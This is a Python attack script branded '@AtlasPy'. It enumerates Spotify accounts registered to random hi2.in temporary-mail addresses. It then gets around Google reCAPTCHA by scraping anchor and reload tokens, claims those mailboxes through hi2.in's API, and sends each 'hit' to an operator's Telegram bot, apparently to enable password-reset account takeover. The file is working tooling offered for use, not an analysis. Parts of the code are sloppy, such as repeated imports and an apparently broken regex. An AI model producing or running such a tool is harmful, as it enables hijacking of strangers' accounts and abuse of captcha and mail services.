import requests
import re
import base64
import time
import os
import threading
import random
import requests
import os
import sys
import requests
import random
import string
import os
import threading
import time
import sys
import re
import json
import hashlib
import uuid
from datetime import datetime
from threading import Thread, Timer
from cfonts import render
from colorama import Fore, Style, init
EXPIRE_TIME = '2046-5-22 23:37:00'
EXPIRE_MSG = ' Ücretsiz Kullanım süresi doldu.özel alımlar için @AtlasPy'

def check_expiration():
    current_time = datetime.now()
    expiration_time = datetime.strptime(EXPIRE_TIME, '%Y-%m-%d %H:%M:%S')
    if current_time > expiration_time:
        print(EXPIRE_MSG)
        sys.exit(1)
check_expiration()

AtlasPy = render('spot', colors=['white', 'green'], align='center')
print("—" * 67)
print(AtlasPy)
print("—" * 67)

token = input(' Bot Token :')
ID = int(input(' Id  : '))
hit = 0
bi = 0
be = 0

try:
    import httpx
    import user_agent
except:
    os.system("pip install httpx httpx[http2] user_agent")
    import httpx
    import user_agent

def check_email(email):
    global bi, hit, be
    siteKey = '6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct'
    siteUrl = 'https://hi2.in/'
    userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36'

    start_time = time.time()

    site_html = requests.get(siteUrl).text

    try:
        renderUrl = re.findall(
            r"""'"['"]""",
            site_html
        )[0]
    except:
        renderUrl = 'https://www.google.com/recaptcha/api2/recaptcha__en.js'

    js = requests.get(renderUrl).text

    match = re.search(r"po.src\s*=\s*'(https://[^']+)';", js)

    if match:
        v = match.group(1).split('/')[5]
        api = renderUrl.split('.js')[0]
        if 'api2' not in api and 'enterprise' not in api:
            api += '2'
    else:
        v = renderUrl.split('/')[5]
        api = 'https://www.google.com/recaptcha/api2'

    site = requests.get('https://www.google.com')
    cookies = site.cookies

    headers = {
        "accept": "/",
        "accept-language": "en-US,en;q=0.9",
        "origin": "https://www.google.com",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": userAgent
    }

    domain = siteUrl.split('/')[2]
    co = base64.b64encode((f'https://{domain}:443').encode()).decode().replace('=', '.')

    anchor_params = {
        'ar': '1',
        'k': siteKey,
        'co': co,
        'hl': 'en',
        'v': v,
        'size': 'invisible',
        'cb': 'abc123'
    }

    headers['referer'] = siteUrl

    anchor = requests.get(
        f'{api}/anchor',
        params=anchor_params,
        headers=headers,
        cookies=cookies
    ).text

    recaptcha_token = anchor.split('recaptcha-token" value="')[1].split('"')[0]

    reload_headers = headers.copy()
    reload_headers.pop('content-type', None)

    reload_data = {
        'v': v,
        'co': co,
        'reason': 'q',
        'size': 'invisible',
        'hl': 'en',
        'k': siteKey,
        'c': recaptcha_token,
        'chr': '',
        'vh': '',
        'bg': ''
    }

    reload = requests.post(
        f'{api}/reload?k={siteKey}',
        data=reload_data,
        headers=reload_headers,
        cookies=cookies
    ).text

    final_token = reload.split('"rresp","')[1].split('"')[0]

    prefix, domin = email.split('@')

    headers2 = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://hi2.in',
        'referer': 'https://hi2.in/',
        'user-agent': userAgent
    }

    data = {
        'domain': domin,
        'prefix': prefix,
        'recaptcha': final_token
    }

    response = requests.post(
        'https://hi2.in/api/custom',
        headers=headers2,
        data=data
    )
    print(response.text)
   
    if "Just a moment..." in response.text:
        print("❌ Error: Cloudflare block turn on vpn or change city ! ")
    elif "hash" in response.text:
        hit += 1
        dd= f"""
𒋨────━𓆩𝐀𝐓𝐋𝐀𝐒𓆪‏‏━────𒋨
• Email: {email}
𒋨────━𓆩𝐀𝐓𝐋𝐀𝐒𓆪‏‏━────𒋨
Dev -  @AtlasPy  •  @AtlasPython        
"""
        
        requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            data={
                "chat_id": ID,
                "text": dd
            }
        )
    elif "address already taken" in response.text:
        be += 1
    else:
        print(email, response.text)

def check_spotify(email):
    global bi, hit, be
    try:
        url = f"https://spclient.wg.spotify.com/signup/public/v1/account?validate=1&email={email}"
        
        headers = {
            'Host': 'spclient.wg.spotify.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Pragma': 'no-cache'
        }

        resp = requests.get(url, headers=headers)
    
        if '"status":1' in resp.text:
            bi += 1
        else:
            keywords = [
                "ese correo electrónico ya está registrado",
                "that email is already registered to an account",
                "cette adresse e-mail est déjà associée à un compte",
                "email is already registered",
                "already registered",
                "already in use"
            ]
            if any(k in resp.text.lower() for k in keywords):
                check_email(email)
            else:
                bi += 1
    except requests.exceptions.RequestException as e:
        bi += 1
    
   
    print(f" \r\033[92mHits\033[0m: {hit} // \033[91mBad Spotify\033[0m: {bi} // \033[95mBad Email\033[0m: {be} \r")

def qq():
    ema=random.choice(['hi2in'])
    letters = "abcdefghijklmnopqrstuvwxyz"
    email = "".join(random.choice(letters) for _ in range(5)) + '@' + ema
    check_spotify(email)

def worker():
    while True:
        qq()

threads_count = 10
for _ in range(threads_count):
    t = threading.Thread(target=worker)
    t.start()